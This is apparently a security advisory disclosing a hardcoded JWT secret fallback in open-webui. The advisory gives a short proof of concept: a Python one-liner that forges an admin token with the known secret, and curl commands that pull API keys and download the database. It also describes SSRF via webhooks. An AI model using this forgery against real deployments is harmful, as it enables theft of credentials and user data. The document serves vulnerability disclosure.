# Hardcoded JWT Secret Fallback Enables Admin Forgery and Full Data Theft

**Package:** open-webui (pip) / ghcr.io/open-webui/open-webui (Docker)
**Affected versions:** <= 0.9.1
**Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)

## Summary

`WEBUI_SECRET_KEY` falls back to the publicly known string `t0p-s3cr3t` in `env.py:564-567` when no secret is set before module import. On affected launch paths (`open-webui dev`, `backend/dev.sh`, bare `uvicorn open_webui.main:app`), any attacker who knows this value can forge a valid admin JWT, access all API keys in cleartext via `GET /openai/config`, download the entire SQLite database via `GET /api/v1/utils/db/download`, and set webhook URLs to internal/cloud metadata endpoints. Default Docker and `open-webui serve` are not affected because they generate a random secret before import.

## Details

**Root cause:** `backend/open_webui/env.py:564-567`

```python
WEBUI_SECRET_KEY = os.environ.get(
    'WEBUI_SECRET_KEY',
    os.environ.get('WEBUI_JWT_SECRET_KEY', 't0p-s3cr3t'),
)
```

`backend/open_webui/utils/auth.py:50` uses this value as `SESSION_SECRET` to sign and verify all JWTs. The check at `env.py:583-584` only raises an error for empty string, not for the hardcoded fallback.

**Affected launch paths:**

| Launch method | Vulnerable? |
|---|---|
| Docker / docker-compose (default) | No — `start.sh` generates random key |
| `open-webui serve` | No — `__init__.py:35-42` generates random key |
| `open-webui dev` | **Yes** |
| `backend/dev.sh` | **Yes** |
| `uvicorn open_webui.main:app` | **Yes** |
| Explicit `WEBUI_SECRET_KEY=t0p-s3cr3t` | **Yes** |

**Consequences once forged (all admin-gated, all confirmed):**
- `GET /openai/config` returns full API keys in cleartext (`openai.py:236-243`)
- `GET /api/v1/utils/db/download` streams entire SQLite database (`utils.py:105-123`, `ENABLE_ADMIN_EXPORT` defaults `True`)
- `POST /api/webhook` accepts any URL with no validation (`main.py:2337-2352`) — SSRF to cloud IMDS
- Admin UUID discovery: `/auths/admin/details` leaks admin email to any authenticated user including pending (gated by `SHOW_ADMIN_DETAILS`, defaults `True`); `/users/search` returns full user objects to verified users

## PoC

```bash
# 1. Start affected deployment
WEBUI_SECRET_KEY=t0p-s3cr3t uvicorn open_webui.main:app --host 0.0.0.0 --port 8080

# 2. Forge admin JWT (requires admin UUID — obtain via /users/search or other means)
python3 -c "
import jwt, uuid, time
token = jwt.encode(
    {'id': '<ADMIN_UUID>', 'jti': str(uuid.uuid4()), 'iat': int(time.time())},
    't0p-s3cr3t', algorithm='HS256'
)
print(token)
"

# 3. Use forged token
curl -H "Authorization: Bearer <FORGED_TOKEN>" http://localhost:8080/openai/config
curl -H "Authorization: Bearer <FORGED_TOKEN>" http://localhost:8080/api/v1/utils/db/download -o stolen.db
```

**Live-confirmed:** Forged admin JWT accessed `/openai/config` and `/api/v1/users/` with full admin privileges on an affected deployment. The same token returned 401 on stock Docker startup (random secret).

Full PoC scripts: `exploit_jwt_forgery.py`, `exploit_admin_data_theft.py`, `exploit_ssrf_webhook.py`

## Impact

On deployments using the default secret, any attacker with network access can forge an admin JWT and gain complete administrative control — reading all API keys, downloading the full database (users, bcrypt hashes, chat history), and configuring webhooks for SSRF to cloud metadata endpoints. CVSS 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

**Full audit report:** https://github.com/tempcollab/open-webui/blob/main/autofyn_audit/audit_report.md
